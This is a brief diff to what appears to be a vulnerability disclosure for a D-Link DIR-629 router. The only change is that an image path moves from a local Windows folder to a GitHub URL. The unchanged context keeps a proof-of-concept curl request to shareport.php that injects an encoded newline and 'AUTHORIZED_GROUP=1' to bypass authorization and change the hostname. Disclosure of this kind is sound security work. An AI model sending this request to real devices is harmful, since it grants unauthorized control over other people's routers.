@@ -55,4 +55,4 @@ POC:
 ``` 
 curl http://[ip]:[port]/shareport.php -d "aaa=%0aAUTHORIZED_GROUP=1&action=sethostname&value=Cyc1e"
 ```
-![image-20191107215245404](C:\Users\MSI1\AppData\Roaming\Typora\typora-user-images\image-20191107215245404.png)
+![image-20191107215245404](https://github.com/Cyc1eC/D-Link/blob/master/DIR-629/image-20191107215245404.png)
